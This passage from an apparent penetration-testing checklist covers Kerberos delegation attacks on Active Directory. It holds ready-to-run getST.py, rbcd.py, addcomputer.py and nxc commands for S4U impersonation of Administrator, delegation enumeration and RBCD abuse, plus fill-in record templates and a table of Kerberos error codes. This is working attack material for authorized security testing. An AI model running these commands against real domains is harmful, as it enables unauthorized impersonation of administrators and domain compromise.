Ticket user:
Groups:
Validated:
```

- [ ] **S4U / Constrained Delegation**

```bash
getST.py -spn cifs/target.corp.local -impersonate Administrator $DOMAIN/svc_web:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/Administrator.ccache
```

Record:

```text
Controlled account:
AllowedToDelegateTo:
Impersonated user:
Target SPN:
Ticket:
Validated:
```

- [ ] **Delegation enumeration**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --find-delegation
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --trusted-for-delegation
```

Record:

```text
Unconstrained:
Constrained:
RBCD:
Sensitive users:
```

- [ ] **RBCD**

```bash
addcomputer.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -computer-name 'ATTACKBOX$' -computer-pass 'MachinePass123!'
rbcd.py -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
getST.py -spn cifs/target.corp.local -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
```

Record:

```text
Target:
Controlled computer:
RBCD write:
Ticket:
Validated:
```

- [ ] **Common Kerberos errors**

| Error | Possible meaning |
| --- | --- |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/SPN does not exist. |
| `KDC_ERR_PREAUTH_REQUIRED` | User exists and requires pre-authentication. |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password/hash/key. |
| `KRB_AP_ERR_SKEW` | Time skew issue. |
| `KRB_AP_ERR_MODIFIED` | SPN/key mismatch or service cannot decrypt ticket. |
| `KDC_ERR_BADOPTION` | Delegation option not allowed or target issue. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Target SPN not found. |
| `KDC_ERR_CLIENT_REVOKED` | Account disabled, locked, expired, or restricted. |
| `KDC_ERR_ETYPE_NOTSUPP` | Unsupported encryption type. |
